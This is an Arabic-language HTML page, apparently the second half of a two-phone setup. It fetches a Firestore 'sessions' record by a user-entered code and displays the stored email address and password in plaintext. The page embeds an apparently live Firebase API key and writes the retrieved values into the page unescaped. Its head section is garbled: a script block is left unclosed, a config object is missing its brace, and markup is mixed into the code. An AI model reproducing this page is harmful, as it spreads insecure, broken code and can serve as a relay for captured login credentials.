<head>

<!-- Firestore -->
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js"></script>

<script>
  // 🔑 إعدادات مشروعك من Firebase
  const firebaseConfig = {
    apiKey: "API_KEY_حط_هنا",
    authDomain: "YOUR_PROJECT.firebaseapp.com",
    projectId: "YOUR_PROJECT",
    storageBucket: "YOUR_PROJECT.appspot.com",
    messagingSenderId: "SENDER_ID",
    appId: "APP_ID"

  // تشغيل Firebase
  const app = firebase.initializeApp(firebaseConfig);

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>الجوال 2 — إدخال الرمز وعرض البيانات</title>
  <!-- Firebase compat SDKs -->
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
  <style>
    body{font-family:Arial,system-ui;background:#0b1020;color:#e9edff;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
    .card{background:#121832;border:1px solid #263164;border-radius:16px;padding:22px;width:min(92%,520px);box-shadow:0 10px 40px rgba(0,0,0,.35)}
    input{width:100%;padding:12px;margin:6px 0 12px;border-radius:10px;border:1px solid #263164;background:#0e1636;color:#e9edff;outline:none}
    button{width:100%;padding:12px;border:0;border-radius:10px;background:#3a69ff;color:#fff;font-weight:800;cursor:pointer}
    .box{margin-top:12px;padding:12px;border:1px dashed #263164;border-radius:12px;word-break:break-all}
    .mono{font-family:ui-monospace,Consolas,monaco,monospace}
  </style>
</head>
<body>
  <div class="card">
    <h2>📱 الجوال 2 — إدخال الرمز</h2>
    <input id="code" placeholder="اكتب الرمز من الجوال 1">
    <button id="check">تحقق</button>
    <div id="out" class="box" style="display:none"></div>
  </div>

  <script>
    // نفس تكوين مشروعك
    const firebaseConfig = {
      apiKey: "AIzaSyDInDvI0xrWCmvfKN6QQQpB5YiESeJS_Jc",
      authDomain: "iugfgg.firebaseapp.com",
      projectId: "iugfgg",
      storageBucket: "iugfgg.firebasestorage.app",
      messagingSenderId: "595497115275",
      appId: "1:595497115275:web:7f019d07b5ea61e2677e8e",
      measurementId: "G-JR5KEPMHPR"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore(app);

    document.getElementById('check').addEventListener('click', async () => {
      const code = (document.getElementById('code').value || '').trim();
      if(!code){ alert('اكتب الرمز'); return; }

      const ref = db.collection('sessions').doc(code);
      const snap = await ref.get();
      const out = document.getElementById('out');

      if(!snap.exists){
        out.style.display='block';
        out.textContent = '❌ الرمز غير صحيح أو منتهي.';
        return;
      }
      const data = snap.data();

      // عرض الإيميل وكلمة المرور التي كتبها جوال 1
      out.style.display='block';
      out.innerHTML =
        '📧 الإيميل: <span class="mono">'+(data.email||'')+'</span><br>'+
        '🔒 كلمة المرور: <span class="mono">'+(data.password||'')+'</span>';

      // (اختياري): حذف المستند بعد القراءة لمرة واحدة
      // await ref.delete();
    });
  </script>
</body>
</html>
